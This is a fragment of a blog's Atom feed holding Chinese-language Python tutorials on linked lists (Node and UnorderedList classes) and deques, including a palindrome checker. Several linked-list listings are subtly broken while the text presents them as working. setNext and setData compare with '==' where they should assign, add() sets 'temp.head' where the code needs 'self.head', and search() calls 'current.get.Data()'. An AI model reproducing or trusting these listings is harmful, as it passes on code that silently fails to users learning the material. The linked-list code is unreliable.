class="keyword">return</span> self.data==newdata</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setNext</span><span class="params">(self,newnext)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.next==newnext</div><div class="line"></div><div class="line"></div><div class="line">temp=Node(<span class="number">93</span>)</div><div class="line">print(temp.getData())</div></pre></td></tr></table></figure><p>Python引用值None类和链表本身发挥重要作用。引用None代表没有下一个节点。请注意在构造函数中，最初创建的节点next被设置为None，有时这被称为接地节点，因此我们使用标准接地符号表示对None的引用。将None显式的分配给初始下一个引用值是一个好主意。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure3.png" alt="image"></p><p><em>Figure 3</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure4.png" alt="image"></p><p><em>Figure 4</em></p><p>###Unordered List类</p><p>如上所述，无序列表将从一组节点构建，每个节点通过显式引用链接到下一个节点。只要我们知道在哪里找到第一个节点（包含第一个项），之后的每个项可以通过连续跟随下一个链接找到。考虑到这一点，UnorderedList类必须保持对第一个节点的引用。Listing 2显示了构造函数。注意，每一个链表对象将维护对链表头部的单个引用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnorderedList</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.head=<span class="keyword">None</span></div></pre></td></tr></table></figure><p><em>Listing 2</em></p><p>我们构建一个空的链表。赋值语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>mylist = UnorderedList()</div></pre></td></tr></table></figure><p>创建如Figure5所示的链表。正如我们在Node类中讨论的，特殊引用None将再次用于表示链表的头部不引用任何内容。最终，先前给出的示例列表如Figure 6所示的链接列表表示。链表的头指代列表的第一项的第一节点。反过来，该节点保存对下一个节点（下一个项）的引用，等等。重要的是注意链表类本身不包含任何节点对象。相反，它只包含对链接结构中第一个节点的单个引用。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure5.png" alt="image"></p><p><em>Figure 5</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure6.png" alt="image"></p><p><em>Figure 6</em></p><p>Listing 3中所示的isEmpty方法只是检查链表头是否是None的引用。布尔表达式self.head==None的结果只有在链表中没有节点时才为真。由于新链表为空，因此构造函数和空检查必须彼此一致。这显示了使用引用None来表示链接结构的 <code>end</code>的优点。在Python中，None可以与任何引用进行比较。如果它们都指向相同的对象，则两个引用是相等的。我们将在其他方法中经常使用它。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">isEmpty</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="keyword">return</span> self.head==<span class="keyword">None</span></div></pre></td></tr></table></figure><p><em>Listing 3</em></p><p>那么，我们如何将项加入我们的链表？我们需要实现add方法。然而，在我们做这一点之前，我们需要解决在链表中哪个位置放置新项的重要问题。由于该链表是无序的，所以新项相对于已经在列表中的其他项的特定位置并不重要。新项可以在任何位置。考虑到这一点，将新项防在最简单的位置是有意义的。</p><p>回想一下，链表结构置位我们提供了一个入口点，即链表的头部。所有其他节点只能通过访问第一个节点，然后跟随下一个链接到达。这意味着添加新节点的最简单的地方就在链表的头部。换句话说，我们将新项作为链表的第一项，现有项将需要链接到这个新项后。</p><p>Figure 6展示了链表调用多次add函数的操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.add(<span class="number">31</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.add(<span class="number">77</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.add(<span class="number">17</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.add(<span class="number">93</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.add(<span class="number">26</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.add(<span class="number">54</span>)</div></pre></td></tr></table></figure><p><em>Figure 6</em></p><p>因为31是添加到链表的第一个项，它最终将是链表中的最后一个节点，因为每个其他项在其前面添加。此外，由于 54 是添加的最后一项，它将成为链表的第一个节点中的数据值。</p><p>add 方法如 Listing 4 所示。链表的每项必须驻留在节点对象中。第 2 行创建一个新节点并将该项作为其数据。现在我们必须通过将新节点链接到现有结构中来完成该过程。这需要两个步骤，如 Figure 7 所示。步骤1（行3）更改新节点的下一个引用以引用旧链表的第一个节点。现在，链表的其余部分已经正确地附加到新节点，我们可以修改链表的头以引用新节点。第 4 行中的赋值语句设置列表的头。</p><p>上述两个步骤的顺序非常重要。如果第 3 行和第 4 行的顺序颠倒，会发生什么？如果链表头部的修改首先发生，则结果可以在 Figure 8 中看到。由于 head 是链表节点的唯一外部引用，所有原始节点都将丢失并且不能再被访问。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnorderedList</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.head=<span class="keyword">None</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isEmpty</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.head == <span class="keyword">None</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self,item)</span>:</span></div><div class="line">        temp=Node(item)</div><div class="line">        temp.setNext(self.head)</div><div class="line">        temp.head=temp</div></pre></td></tr></table></figure><p><em>Listing 4</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure7.png" alt="image"></p><p><em>Figure 7</em> </p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure8.png" alt="image"></p><p><em>Figure 8</em></p><p>我们将实现的下面的方法 - <code>size</code>，<code>search</code> 和 <code>remove</code> - 都基于一种称为链表遍历的技术。遍历是指系统地访问每个节点的过程。为此，我们使用从链表中第一个节点开始的外部引用。当我们访问每个节点时，我们通过“遍历”下一个引用来移动到对下一个节点的引用。</p><p>要实现 <code>size</code> 方法，我们需要遍历链表并对节点数计数。Listing 5 展示了用于计算列表中节点数的 Python 代码。外部引用称为 <code>current</code>，并在第二行被初始化到链表的头部。开始的时候，我们没有看到任何节点，所以计数设置为 0 。第 4-6 行实际上实现了遍历。只要当前引用没到链表的结束位置（None），我们通过第 6 行中的赋值语句将当前元素移动到下一个节点。再次，将引用与 None 进行比较的能力是非常有用的。每当 <code>current</code> 移动到一个新的节点，我们加 1 以计数。最后，<code>count</code> 在迭代停止后返回。Figure 9 展示了处理这个链表的过程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">size</span><span class="params">(self)</span>:</span></div><div class="line">    current=self.head</div><div class="line">    count=<span class="number">0</span></div><div class="line">    <span class="keyword">while</span> current!=<span class="keyword">None</span>:</div><div class="line">        count=count+<span class="number">1</span></div><div class="line">        current=current.getNext()</div><div class="line">    <span class="keyword">return</span> count</div></pre></td></tr></table></figure><p><em>Listing 5</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure9.png" alt="image"></p><p><em>Figure 9</em></p><p>在链表中搜索也使用遍历技术。当我们访问链表中的每个节点时，我们将询问储存在其中的数据是否与我们正在寻找的项匹配。然而，在这种情况下，我们不必一直遍历到列表的末尾。事实上，如果我们到达链表的末尾，这意味着我们正在寻找的项不存在。此外，如果我们找到项，没有必要继续。</p><p>Listing 6展示了搜索方法的实现。和在size方法中一样，遍历从列表的头部开始初始化（行2）。我们还使用一个布尔变量叫found，标记我们是否找到了正在寻找的项。因为我们还没有在遍历开始时找到该项，found设置为False（第3行）。第4行中迭代考虑了上述两个条件。只要有更多的节点访问，而且我们没有找到正在寻找的项，我们就继续检查下一个节点。第5行检查数据项是否存在于当前节点中。如果存在，found设置为True。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self,item)</span>:</span></div><div class="line">    current=self.head</div><div class="line">    found=<span class="keyword">False</span></div><div class="line">    </div><div class="line">    <span class="keyword">while</span> current!=<span class="keyword">None</span> <span class="keyword">and</span> <span class="keyword">not</span> found:</div><div class="line">        <span class="keyword">if</span> current.get.Data()==item:</div><div class="line">            found=<span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            current=current.getNext()</div><div class="line">    <span class="keyword">return</span> found</div></pre></td></tr></table></figure><p><em>Listing 6</em></p><p>作为一个例子，试试调用search方法来查找item17</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>mylist.search(<span class="number">17</span>)</div><div class="line"><span class="keyword">True</span></div></pre></td></tr></table></figure><p>因为17在列表中，所以遍历过程中需要移动到包含17的节点。此时，<code>found</code> 变量设置为 True，while 条件将失败，返回值。 这个过程可以在 Figure 10中看到。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure10.png" alt="image"></p><p><em>Figure 10</em></p><p><code>remove</code> 方法需要两个逻辑步骤。首先，我们需要遍历列表寻找我们要删除的项。一旦我们找到该项（我们假设它存在），删除它。第一步非常类似于搜索。从设置到链表头部的外部引用开始，我们遍历链接，直到我们发现正在寻找的项。因为我们假设项存在，我们知道迭代将在 <code>current</code> 变为 <code>None</code> 之前停止。这意味着我们可以简单地使用 <code>found</code> 布尔值。</p><p>当 <code>found</code> 变为 True 时，<code>current</code> 将是对包含要删除的项的节点的引用。但是我们如何删除呢？一种方法是用标示该项目不再存在的某个标记来替换项目的值。这种方法的问题是节点数量将不再匹配项数量。最好通过删除整个节点来删除该项。</p><p>为了删除包含项的节点，我们需要修改上一个节点中的链接，以便它指向当前之后的节点。不幸的是，链表遍历没法回退。因为 <code>current</code> 指我们想要进行改变的节点之前的节点，所以进行修改太迟了。</p><p>这个困境的解决方案是在我们遍历链表时使用两个外部引用。<code>current</code> 将像之前一样工作，标记遍历的当前位置。新的引用，我们叫 <code>previous</code>，将总是传递 <code>current</code>后面的一个节点 。这样，当 <code>current</code> 停止在要被去除的节点时，<code>previous</code> 将引用链表中用于修改的位置。</p><p>Listing 7 展示了完整的 <code>remove</code> 方法。第 2-3 行给这两个引用赋初始值。注意，<code>current</code> 在链表头处开始，和在其他遍历示例中一样。然而，<code>previous</code> 假定总是在 <code>current</code>之后一个节点。因此，由于在 <code>previous</code> 之前没有节点，所以之前的值将为 None（见 Figure 11）。<code>found</code> 的布尔变量将再次用于控制迭代。</p><p>在第 6-7 行中，我们检查存储在当前节点中的项是否是我们希望删除的项。如果是，<code>found</code> 设置为 True 。如果我们没有找到该项，则 <code>previous</code> 和 <code>current</code> 都必须向前移动一个节点。同样，这两个语句的顺序是至关重要的。<code>previous</code> 必须先将一个节点移动到 <code>current</code> 的位置。此时，才可以移动<code>current</code>。这个过程通常被称为“英寸蠕动”，因为 <code>previous</code> 必须赶上 <code>current</code>，然后 <code>current</code> 前进。Figure 12 展示了 <code>previous</code> 和<code>current</code> 的移动，它们沿着链表向下移动，寻找包含值 17 的节点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(self,item)</span>:</span></div><div class="line">    current=self.head</div><div class="line">    previous=<span class="keyword">None</span></div><div class="line">    found=<span class="keyword">False</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> found:</div><div class="line">        <span class="keyword">if</span> current.getData()==item:</div><div class="line">            found=<span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            previous=current</div><div class="line">            current=current.getNext()</div><div class="line"></div><div class="line">    <span class="keyword">if</span> previous==<span class="keyword">None</span>:</div><div class="line">        self.head=current.getNext()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        previous.setNext(current.getNext())</div></pre></td></tr></table></figure><p><em>Figure 11</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure12.png" alt="image"></p><p><em>Figure 12</em></p><p>一旦 <code>remove</code> 的搜索步骤已经完成，我们需要从链表中删除该节点。 Figure 13 展示了要修改的链接。但是，有一个特殊情况需要解决。 如果要删除的项目恰好是链表中的第一个项，则 <code>current</code> 将引用链接列表中的第一个节点。这也意味着 <code>previous</code> 是 None。 我们先前说过，<code>previous</code> 是一个节点，它的下一个节点需要修改。在这种情况下，不是 <code>previous</code> ，而是链表的 <code>head</code> 需要改变（见 Figure 14）。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure13.png" alt="image"></p><p><em>Figure 13</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8/assets/3.21.%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8%EF%BC%9A%E9%93%BE%E8%A1%A8.figure14.png" alt="image"></p><p><em>Figure 14</em></p><p>第 12 行检查是否处理上述的特殊情况。如果 <code>previous</code> 没有移动，当 <code>found</code> 的布尔变为 True 时，它仍是 None。 在这种情况下（行13），链表的 <code>head</code> 被修改以指代当前节点之后的节点，实际上是从链表中移除第一节点。 但是，如果 <code>previous</code> 不为 None，则要删除的节点位于链表结构的下方。 在这种情况下，<code>previous</code> 的引用为我们提供了下一个引用更改的节点。第 15 行使用之前的 <code>setNext</code> 方法完成删除。注意，在这两种情况下，引用更改的目标是 <code>current.getNext()</code>。 经常出现的一个问题是，这里给出的两种情况是否也将处理要移除的项在链表的最后节点中的情况。我们留给你思考。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;列表&quot;&gt;&lt;a href=&quot;#列表&quot; class=&quot;headerlink&quot; title=&quot;列表&quot;&gt;&lt;/a&gt;列表&lt;/h1&gt;&lt;p&gt;在对基本数据结构的讨论中，我们使用Python列表来实现所呈现的抽象数据类型。列表是一个强大但简单的收集机制，为程序员提供了各种各样的操作。然而，不是所有的编程语言都包括列表集合、在这些情况下，列表的概念必须由程序员实现。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>什么是Deque</title>
    <link href="http://adamzeng.site/2017/10/29/%E4%BB%80%E4%B9%88%E6%98%AFDeque/"/>
    <id>http://adamzeng.site/2017/10/29/什么是Deque/</id>
    <published>2017-10-29T14:14:57.000Z</published>
    <updated>2017-10-29T14:53:19.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是Deque"><a href="#什么是Deque" class="headerlink" title="什么是Deque"></a>什么是Deque</h1><p>deque（也称为双端队列）是与队列类似的项的有序集合。它有两个端部，首部和尾部，并且项在集合中保持不变。deque不同的地方是添加和删除项是非限制性的。可以在前面或后面添加新项。同样，可以从任一端移除现有项。在某种意义上，这种混合线性结构提供了单个数据结构中的栈和队列的所有能力。Figure 1展示了一个Python数据对象的deque。<a id="more"></a></p><p>要注意，即使deque可以拥有栈和队列的许多特性，它不需要由哪些数据结构强制的LIFO和FIFO排序。这取决于你如何持续添加和删除操作。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.15.%E4%BB%80%E4%B9%88%E6%98%AFDeque/assets/3.15.%E4%BB%80%E4%B9%88%E6%98%AFDeque.figure1-1.png" alt="image"></p><p><em>Figure 1</em></p><h3 id="Deque抽象数据类型"><a href="#Deque抽象数据类型" class="headerlink" title="Deque抽象数据类型"></a>Deque抽象数据类型</h3><p>deque抽象数据类型由以下结构和操作定义。如上所述，deque被构造为项的有序集合，其中项从首部或尾部的任一端添加和移除。下面给出了deque操作。</p><ul><li>Deque()创建一个空的新deque，它不需要参数，并返回空的deque。</li><li>addFront(item)将一个新项添加到deque首部。它需要item参数，并不返回任何内容。</li><li>addRear(item)将一个新项添加到deque尾部。它需要item参数，并不返回任何内容。</li><li>removeFront() 从 deque 中删除首项。它不需要参数并返回 item。deque 被修改。</li><li>removeRear() 从 deque 中删除尾项。它不需要参数并返回 item。deque 被修改。</li><li>isEmpty() 测试 deque 是否为空。它不需要参数，并返回布尔值。</li><li>size() 返回 deque 中的项数。它不需要参数，并返回一个整数。</li></ul><p>例如，我们假设 d 是已经创建并且当前为空的 deque，则 Table 1 展示了一系列 deque 操作的结果。注意，首部的内容列在右边。在将 item 移入和移出时，跟踪前面和后面是非常重要的，因为可能会有点混乱。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.16.Deque%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/assets/3.16.Deque%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.table1.png" alt="image"></p><p><em>Table 1</em></p><h3 id="Python实现Deque"><a href="#Python实现Deque" class="headerlink" title="Python实现Deque"></a>Python实现Deque</h3><p>正如我们在前面的部分中所做的，我们将为抽象数据类型deque的实现创建一个新类。同样，Python列表将提供一组非常好的方法来构建deque的细节。我们的实现（Listing 1）将假定deque的尾部在列表中的位置为0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deque</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.items= []</div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isEmpty</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.items==[]</div><div class="line">     </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addFront</span><span class="params">(self,item)</span>:</span></div><div class="line">        self.items.append(item)</div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addRear</span><span class="params">(self,item)</span>:</span></div><div class="line">        self.items.insert(<span class="number">0</span>,item)</div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeFront</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.items.pop()</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeRear</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.items.pop(<span class="number">0</span>)</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">size</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> len(self.items)</div></pre></td></tr></table></figure><p><em>Listing 1</em></p><p>在removeFront中，我们使用pop方法从列表中删除最后一个元素。但是，在removeRear中，pop(0)方法必须删除列表的第一个元素。同样，我们需要在addRear中使用insert方法（第12行），因为append方法在列表末尾添加一个新元素。</p><p>你可以看到许多与栈和队列中描述的 Python 代码相似之处。你也可能观察到，在这个实现中，从前面添加和删除项是 O(1)，而从后面添加和删除是 O(n)。 考虑到添加和删除项是出现的常见操作，这是可预期的。 同样，重要的是要确定我们知道在实现中前后都分配在哪里。</p><h3 id="回文检查"><a href="#回文检查" class="headerlink" title="回文检查"></a>回文检查</h3><p>使用 deque 数据结构可以容易地解决经典回文问题。回文是一个字符串，读取首尾相同的字符，例如，<code>radar toot madam</code>。 我们想构造一个算法输入一个字符串，并检查它是否是一个回文。</p><p>该问题的解决方案将使用 deque 来存储字符串的字符。我们从左到右处理字符串，并将每个字符添加到 deque 的尾部。在这一点上，deque 像一个普通的队列。然而，我们现在可以利用 deque 的双重功能。 deque 的首部保存字符串的第一个字符，deque 的尾部保存最后一个字符（见 Figure 2）。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.18.%E5%9B%9E%E6%96%87%E6%A3%80%E6%9F%A5/assets/3.18.%E5%9B%9E%E6%96%87%E6%A3%80%E6%9F%A5.figure2.png" alt="image"></p><p><em>Figure 2</em></p><p>我们可以直接删除并比较首尾字符，只有当它们匹配时才继续。如果可以持续匹配首尾字符，我们最终要么用完字符，要么留出大小为1的deque，取决于原始字符串的长度是偶数还是奇数。在任一情况下，字符串都是回文。回文检查的完整功能在ActiveCode1中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pythonds.basic.deque <span class="keyword">import</span> Deque</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">palchecker</span><span class="params">(aString)</span>:</span></div><div class="line">    chardeque=Deque()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> aString:</div><div class="line">        chardeque.addRear(ch)</div><div class="line"></div><div class="line">    stillEqual=<span class="keyword">True</span></div><div class="line">    </div><div class="line">    <span class="keyword">while</span> chardeque.size()&gt;<span class="number">1</span> <span class="keyword">and</span> stillEqual:</div><div class="line">        first=chardeque.removeFront()</div><div class="line">        last=chardeque.removeRear()</div><div class="line">        <span class="keyword">if</span> first!=last:</div><div class="line">            stillEqual=<span class="keyword">False</span></div><div class="line">        </div><div class="line">            </div><div class="line">    <span class="keyword">return</span> stillEqual</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;什么是Deque&quot;&gt;&lt;a href=&quot;#什么是Deque&quot; class=&quot;headerlink&quot; title=&quot;什么是Deque&quot;&gt;&lt;/a&gt;什么是Deque&lt;/h1&gt;&lt;p&gt;deque（也称为双端队列）是与队列类似的项的有序集合。它有两个端部，首部和尾部，并且项在集合中保持不变。deque不同的地方是添加和删除项是非限制性的。可以在前面或后面添加新项。同样，可以从任一端移除现有项。在某种意义上，这种混合线性结构提供了单个数据结构中的栈和队列的所有能力。Figure 1展示了一个Python数据对象的deque。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>什么是队列</title>
    <link href="http://adamzeng.site/2017/10/29/%E4%BB%80%E4%B9%88%E6%98%AF%E9%98%9F%E5%88%97/"/>
    <id>http://adamzeng.site/2017/10/29/什么是队列/</id>
    <published>2017-10-29T10:41:28.000Z</published>
    <updated>2017-10-29T14:10:30.000Z</updated>
    
